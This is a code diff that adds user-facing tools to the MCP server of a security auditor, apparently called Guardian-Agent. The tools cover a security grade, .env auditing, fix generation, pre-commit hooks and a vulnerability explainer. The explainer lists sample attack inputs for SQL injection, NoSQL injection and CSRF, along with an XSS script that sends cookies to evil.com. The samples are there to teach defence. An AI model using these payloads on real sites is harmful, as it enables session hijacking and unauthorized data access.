@@ -24,6 +24,12 @@ import { ConfigAuditor } from '../src/auditors/config.js';
 import { SafeChecker } from '../src/auditors/safe-checks.js';
 import { Reporter } from '../src/reporters/json-reporter.js';
 
+// User-friendly tools
+import { SecurityScoreCalculator } from '../src/tools/security-score.js';
+import { EnvAuditor } from '../src/tools/env-auditor.js';
+import { SecurityFixGenerator } from '../src/tools/security-fix-generator.js';
+import { PreCommitHookGenerator } from '../src/tools/pre-commit-hook.js';
+
 /**
  * MCP Server for Guardian-Agent
  */
@@ -89,6 +95,28 @@ class GuardianMCPServer {
 
       case 'check_react_vulnerabilities':
         return await this.checkReactVulnerabilities(params);
+
+      // User-friendly tools
+      case 'security_score':
+        return await this.getSecurityScore(params);
+
+      case 'audit_env_files':
+        return await this.auditEnvFiles(params);
+
+      case 'generate_env_example':
+        return await this.generateEnvExample(params);
+
+      case 'generate_security_fix':
+        return await this.generateSecurityFix(params);
+
+      case 'generate_pre_commit_hook':
+        return await this.generatePreCommitHook(params);
+
+      case 'install_pre_commit_hook':
+        return await this.installPreCommitHook(params);
+
+      case 'explain_vulnerability':
+        return await this.explainVulnerability(params);
 
       default:
         return { error: `Unknown tool: ${toolName}` };
@@ -639,6 +667,232 @@ class GuardianMCPServer {
     const map = { critical: 'error', high: 'error', medium: 'warning', low: 'note', info: 'note' };
     return map[severity] || 'note';
   }
+
+  // ============================================
+  // User-Friendly Tools
+  // ============================================
+
+  /**
+   * Calculate security score (A-F grade)
+   */
+  async getSecurityScore(params = {}) {
+    console.error(`[Guardian] Calculating security score...`);
+
+    // Run a full scan if we don't have findings
+    if (this.findings.length === 0) {
+      await this.runFullScan({});
+    }
+
+    const calculator = new SecurityScoreCalculator(this.projectPath);
+    const result = calculator.calculate(this.findings);
+
+    return {
+      success: true,
+      score: result.score,
+      grade: result.grade,
+      emoji: result.gradeEmoji,
+      summary: result.summary,
+      breakdown: result.breakdown,
+      top_issues: result.topIssues,
+      recommendations: result.recommendations,
+      ascii_card: calculator.toAsciiCard(result)
+    };
+  }
+
+  /**
+   * Audit environment files
+   */
+  async auditEnvFiles(params = {}) {
+    console.error(`[Guardian] Auditing environment files...`);
+
+    const auditor = new EnvAuditor(this.projectPath);
+    const result = await auditor.audit();
+
+    this.findings = [...this.findings, ...result.findings];
+
+    return {
+      success: true,
+      files_audited: result.filesAudited,
+      findings_count: result.findings.length,
+      findings: result.findings,
+      summary: result.summary
+    };
+  }
+
+  /**
+   * Generate .env.example from existing .env
+   */
+  async generateEnvExample(params = {}) {
+    console.error(`[Guardian] Generating .env.example...`);
+
+    const auditor = new EnvAuditor(this.projectPath);
+    const result = await auditor.generateEnvExample();
+
+    if (result.error) {
+      return { success: false, error: result.error };
+    }
+
+    return {
+      success: true,
+      source_file: result.sourceFile,
+      content: result.content,
+      instructions: 'Save this content to .env.example and commit to version control.'
+    };
+  }
+
+  /**
+   * Generate fix for a specific vulnerability
+   */
+  async generateSecurityFix(params = {}) {
+    const { finding_index, finding_title } = params;
+
+    console.error(`[Guardian] Generating security fix...`);
+
+    // Find the relevant finding
+    let finding = null;
+    if (finding_index !== undefined && this.findings[finding_index]) {
+      finding = this.findings[finding_index];
+    } else if (finding_title) {
+      finding = this.findings.find(f =>
+        f.title.toLowerCase().includes(finding_title.toLowerCase())
+      );
+    } else if (this.findings.length > 0) {
+      // Default to first critical/high finding
+      finding = this.findings.find(f => f.severity === 'critical') ||
+                this.findings.find(f => f.severity === 'high') ||
+                this.findings[0];
+    }
+
+    if (!finding) {
+      return {
+        success: false,
+        error: 'No finding specified or found. Run a scan first.'
+      };
+    }
+
+    const generator = new SecurityFixGenerator(this.projectPath);
+    const fix = await generator.generateFix(finding);
+
+    return {
+      success: true,
+      finding: {
+        severity: finding.severity,
+        title: finding.title,
+        location: finding.location
+      },
+      fix
+    };
+  }
+
+  /**
+   * Generate pre-commit hook
+   */
+  async generatePreCommitHook(params = {}) {
+    console.error(`[Guardian] Generating pre-commit hook...`);
+
+    const generator = new PreCommitHookGenerator(this.projectPath);
+    const result = await generator.generate(params);
+
+    return {
+      success: true,
+      hook_content: result.hookContent,
+      instructions: result.instructions,
+      husky_config: result.huskyConfig,
+      lint_staged_config: result.lintStagedConfig
+    };
+  }
+
+  /**
+   * Install pre-commit hook directly
+   */
+  async installPreCommitHook(params = {}) {
+    console.error(`[Guardian] Installing pre-commit hook...`);
+
+    const generator = new PreCommitHookGenerator(this.projectPath);
+    const result = await generator.install(params);
+
+    return result;
+  }
+
+  /**
+   * Explain a vulnerability in simple terms
+   */
+  async explainVulnerability(params = {}) {
+    const { vulnerability_type } = params;
+
+    const explanations = {
+      'sql-injection': {
+        name: 'SQL Injection',
+        simple: 'Attackers can run their own database commands through your app.',
+        how_it_works: 'When user input is directly put into SQL queries, attackers can add their own SQL code.',
+        example_attack: "Input: ' OR '1'='1' -- turns SELECT * FROM users WHERE id='INPUT' into SELECT * FROM users WHERE id='' OR '1'='1' --'",
+        impact: 'Attackers can read, modify, or delete all your database data.',
+        fix: 'Always use parameterized queries. Never concatenate user input into SQL.',
+        difficulty: 'Easy to exploit, easy to fix'
+      },
+      'xss': {
+        name: 'Cross-Site Scripting (XSS)',
+        simple: 'Attackers can run JavaScript in your users\' browsers.',
+        how_it_works: 'When user input is displayed as HTML without escaping, attackers can inject scripts.',
+        example_attack: 'Input: <script>document.location="evil.com?cookie="+document.cookie</script>',
+        impact: 'Attackers can steal cookies, hijack sessions, or deface your site.',
+        fix: 'Always escape HTML output. Use textContent instead of innerHTML.',
+        difficulty: 'Easy to exploit, easy to fix'
+      },
+      'hardcoded-secrets': {
+        name: 'Hardcoded Secrets',
+        simple: 'Passwords and API keys are stored in your code where anyone can see them.',
+        how_it_works: 'Secrets in source code get committed to git and may be exposed publicly.',
+        example_attack: 'Attacker finds your GitHub repo and searches for "API_KEY" or "password".',
+        impact: 'Attackers gain access to your services, databases, or third-party APIs.',
+        fix: 'Move secrets to environment variables. Add .env to .gitignore.',
+        difficulty: 'Very easy to exploit, easy to fix'
+      },
+      'missing-auth': {
+        name: 'Missing Authentication',
+        simple: 'Some pages or APIs can be accessed without logging in.',
+        how_it_works: 'Protected resources don\'t check if the user is authenticated.',
+        example_attack: 'Attacker directly visits /admin/users without logging in.',
+        impact: 'Unauthorized access to sensitive data or admin functions.',
+        fix: 'Add authentication middleware to all protected routes.',
+        difficulty: 'Very easy to exploit, easy to fix'
+      },
+      'nosql-injection': {
+        name: 'NoSQL Injection',
+        simple: 'Attackers can manipulate MongoDB queries to access unauthorized data.',
+        how_it_works: 'MongoDB operators like $gt, $ne can be injected through JSON input.',
+        example_attack: 'Input: {"$gt": ""} matches all documents instead of one.',
+        impact: 'Attackers can bypass authentication or access all data.',
+        fix: 'Validate input types. Use express-mongo-sanitize middleware.',
+        difficulty: 'Easy to exploit, easy to fix'
+      },
+      'csrf': {
+        name: 'Cross-Site Request Forgery',
+        simple: 'Attackers can make your users perform actions without knowing.',
+        how_it_works: 'Malicious sites can trigger requests to your site using the user\'s cookies.',
+        example_attack: '<img src="yoursite.com/api/delete-account"> on an evil site.',
+        impact: 'Users unknowingly perform actions like transfers or deletions.',
+        fix: 'Use CSRF tokens. Check Origin/Referer headers.',
+        difficulty: 'Medium to exploit, medium to fix'
+      }
+    };
+
+    const type = vulnerability_type?.toLowerCase().replace(/\s+/g, '-');
+    const explanation = explanations[type];
+
+    if (!explanation) {
+      return {
+        success: true,
+        available_types: Object.keys(explanations),
+        message: 'Specify a vulnerability_type parameter. Available types listed above.'
+      };
+    }
+
+    return {
+      success: true,
+      vulnerability: explanation
+    };
+  }
 }
 
 /**
@@ -767,6 +1021,65 @@ async function main() {
                   name: 'check_react_vulnerabilities',
                   description: 'Checks React ecosystem packages for known vulnerabilities (react, next.js, react-router, etc.)',
                   inputSchema: { type: 'object', properties: {} }
+                },
+                // User-friendly tools
+                {
+                  name: 'security_score',
+                  description: 'Get a simple A-F security grade for your project with top issues to fix',
+                  inputSchema: { type: 'object', properties: {} }
+                },
+                {
+                  name: 'audit_env_files',
+                  description: 'Check .env files for exposed secrets and security issues',
+                  inputSchema: { type: 'object', properties: {} }
+                },
+                {
+                  name: 'generate_env_example',
+                  description: 'Generate a safe .env.example file from your existing .env',
+                  inputSchema: { type: 'object', properties: {} }
+                },
+                {
+                  name: 'generate_security_fix',
+                  description: 'Auto-generate code to fix a specific vulnerability',
+                  inputSchema: {
+                    type: 'object',
+                    properties: {
+                      finding_index: { type: 'integer', description: 'Index of finding from scan results' },
+                      finding_title: { type: 'string', description: 'Title of finding to fix' }
+                    }
+                  }
+                },
+                {
+                  name: 'generate_pre_commit_hook',
+                  description: 'Generate a git pre-commit hook to prevent committing secrets',
+                  inputSchema: {
+                    type: 'object',
+                    properties: {
+                      checkSecrets: { type: 'boolean', default: true },
+                      checkEnvFiles: { type: 'boolean', default: true },
+                      checkDebugCode: { type: 'boolean', default: true }
+                    }
+                  }
+                },
+                {
+                  name: 'install_pre_commit_hook',
+                  description: 'Install the security pre-commit hook directly into .git/hooks',
+                  inputSchema: {
+                    type: 'object',
+                    properties: {
+                      force: { type: 'boolean', description: 'Overwrite existing hook' }
+                    }
+                  }
+                },
+                {
+                  name: 'explain_vulnerability',
+                  description: 'Get a simple explanation of a vulnerability type (sql-injection, xss, etc.)',
+                  inputSchema: {
+                    type: 'object',
+                    properties: {
+                      vulnerability_type: { type: 'string', description: 'Type: sql-injection, xss, hardcoded-secrets, nosql-injection, csrf, missing-auth' }
+                    }
+                  }
                 }
               ]
             }
